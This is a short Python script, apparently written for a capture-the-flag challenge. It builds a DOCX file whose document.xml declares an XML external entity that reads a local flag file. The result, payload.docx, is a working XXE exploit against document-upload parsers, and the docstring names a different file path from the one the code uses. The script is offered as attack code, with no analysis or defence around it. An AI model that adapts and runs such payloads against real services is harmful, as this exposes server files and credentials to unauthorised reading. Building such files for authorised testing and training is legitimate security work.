import zipfile
import io

def create_xxe_docx():
    """Create DOCX with XXE targeting /home/app/flag.txt"""
    
    document_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "file:///home/vegan/flag.txt">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>FLAG: [&xxe;]</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>'''
    
    # Create ZIP/DOCX
    with zipfile.ZipFile('payload.docx', 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml', '''<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>''')
        zf.writestr('_rels/.rels', '''<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>''')
        zf.writestr('word/_rels/document.xml.rels', '''<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>''')
        zf.writestr('word/document.xml', document_xml)
    
    print("Created payload.docx")

if __name__ == '__main__':
    create_xxe_docx()
